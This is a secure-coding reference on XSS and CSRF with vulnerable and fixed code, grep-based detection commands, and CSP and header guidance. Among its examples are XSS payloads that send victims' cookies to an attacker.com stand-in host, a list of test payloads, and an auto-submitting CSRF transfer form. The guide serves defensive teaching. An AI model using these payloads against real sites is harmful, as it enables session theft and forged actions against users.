# XSS & CSRF — Reference

## XSS (Cross-Site Scripting)

### Type 1: Reflected XSS
User input → server → response → executed in victim's browser.

```python
# VULNERABLE — Flask
@app.route("/search")
def search():
    query = request.args.get("q")
    return f"<h1>Results for: {query}</h1>"  # XSS!

# Attack: /search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# SAFE
from markupsafe import escape
return f"<h1>Results for: {escape(query)}</h1>"
```

### Type 2: Stored XSS
Malicious input stored in DB → rendered to other users.

```python
# VULNERABLE — storing unsanitized user content
await Comment.create(text=request.json["text"])  # no sanitization

# Later rendered as:
# <div class="comment">{{ comment.text | safe }}</div>  ← NEVER use | safe with user content

# SAFE — sanitize on output, or use auto-escape (default in Jinja2)
# <div class="comment">{{ comment.text }}</div>  ← Jinja2 auto-escapes
```

### Type 3: DOM-based XSS
JavaScript reads attacker-controlled source and writes to dangerous sink.

```javascript
// VULNERABLE
const name = location.hash.slice(1);  // source: URL fragment
document.getElementById("welcome").innerHTML = `Hello ${name}`;  // sink

// Attack: page.html#<img src=x onerror=alert(document.cookie)>

// SAFE
document.getElementById("welcome").textContent = `Hello ${name}`;  // textContent is safe
// OR sanitize with DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### React-Specific
```tsx
// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// SAFE — only use with DOMPurify-sanitized content
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />

// BEST — don't use dangerouslySetInnerHTML at all for user content
<div>{userContent}</div>  // React auto-escapes text content
```

### Detection
```bash
# React/Vue dangerous HTML
grep -rn "dangerouslySetInnerHTML\|v-html\|ng-bind-html\|bypassSecurityTrustHtml" \
  --include="*.tsx" --include="*.ts" --include="*.vue" --include="*.js" \
  . | grep -v node_modules | grep -v test | grep -v DOMPurify

# Python templates — unsafe rendering
grep -rn "| safe\|Markup(\|markupsafe\|render_template_string" \
  --include="*.py" --include="*.html" . | grep -v test

# DOM sinks
grep -rn "\.innerHTML\s*=\|document\.write(\|\.outerHTML\s*=" \
  --include="*.ts" --include="*.js" . | grep -v node_modules | grep -v test
```

### XSS Payloads for Testing
```html
<!-- Basic detection -->
<script>alert(1)</script>
"><script>alert(1)</script>

<!-- Attribute injection -->
" onmouseover="alert(1)
' onfocus='alert(1)

<!-- Image-based -->
<img src=x onerror=alert(1)>
<img src="x" onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">

<!-- SVG -->
<svg onload=alert(1)>

<!-- Data exfiltration -->
<script>document.location='https://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
```

---

## CSRF (Cross-Site Request Forgery)

### What It Is
Attacker's page makes browser submit authenticated request to victim's app.

```html
<!-- Attacker's page -->
<form action="https://victim-app.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
<!-- If victim is logged in, their cookies are sent automatically -->
```

### CSRF Protection Methods

**Method 1: CSRF Token (stateful)**
```python
# FastAPI with CSRF token
from starlette_csrf import CSRFMiddleware
app.add_middleware(CSRFMiddleware, secret="your-csrf-secret")

# Every state-changing request must include X-CSRFToken header
# Token validated server-side
```

**Method 2: SameSite Cookie (modern)**
```python
# Set session cookie with SameSite=Strict or Lax
response.set_cookie(
    "session",
    session_id,
    httponly=True,
    secure=True,
    samesite="strict"  # or "lax" for cross-origin navigation
)
# SameSite=Strict: cookie not sent on ANY cross-origin request
# SameSite=Lax: cookie sent on top-level navigation, not on cross-origin POST
```

**Method 3: Custom Header (for JSON APIs)**
```javascript
// Custom headers cannot be set by HTML forms or simple fetch
// So requiring a custom header (e.g., X-Requested-With: XMLHttpRequest) prevents CSRF
// This works ONLY if CORS is properly configured to reject unauthorized origins
```

### What Needs CSRF Protection
```
YES — state-changing endpoints:
- POST /api/profile (update profile)
- DELETE /api/posts/{id}
- POST /api/transfer
- PUT /api/settings

NO — exempt by nature:
- GET endpoints (should not change state)
- Endpoints that require Bearer token in Authorization header
  (cannot be set by HTML forms — natural CSRF protection)
- Webhook endpoints (use HMAC signature instead)
```

### Detection
```bash
# Find state-changing endpoints without CSRF protection
grep -rn "@app\.post\|@app\.put\|@app\.delete\|@router\.post\|@router\.put\|@router\.delete" \
  --include="*.py" . | grep -v test

# Check if CSRF middleware is configured
grep -rn "CSRFMiddleware\|csrf_protect\|csrf_token\|X-CSRFToken\|SameSite" \
  --include="*.py" --include="*.ts" . | grep -v test | grep -v node_modules

# Check cookie flags
grep -rn "set_cookie\|response\.cookies" --include="*.py" . | grep -v test
# → Verify samesite= is set
```

---

## Content Security Policy (CSP)

### Missing or Weak CSP
```python
# Check response headers for CSP
grep -rn "Content-Security-Policy\|CSP\|add_header.*Content-Security" \
  --include="*.py" --include="*.ts" --include="*.conf" --include="*.nginx" \
  . | grep -v node_modules | grep -v test
```

### Dangerous CSP Directives
```
WEAK (allows XSS):
Content-Security-Policy: default-src *
Content-Security-Policy: script-src 'unsafe-inline'
Content-Security-Policy: script-src 'unsafe-eval'

STRONG:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

---

## Security Headers Check
```bash
# All headers that should be present
grep -rn "X-Frame-Options\|X-Content-Type-Options\|X-XSS-Protection\|Strict-Transport\|Referrer-Policy\|Permissions-Policy" \
  --include="*.py" --include="*.ts" --include="*.conf" . | grep -v node_modules | grep -v test
```

Expected headers:
```
X-Frame-Options: DENY                  # prevents clickjacking
X-Content-Type-Options: nosniff        # prevents MIME sniffing
Strict-Transport-Security: max-age=31536000; includeSubDomains  # HTTPS only
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: <policy>      # XSS mitigation
```

---

## CWE References
- CWE-79: XSS (Improper Neutralization of Input During Web Page Generation)
- CWE-352: CSRF
- CWE-116: Improper Encoding or Escaping of Output
- CWE-693: Protection Mechanism Failure (missing security headers)
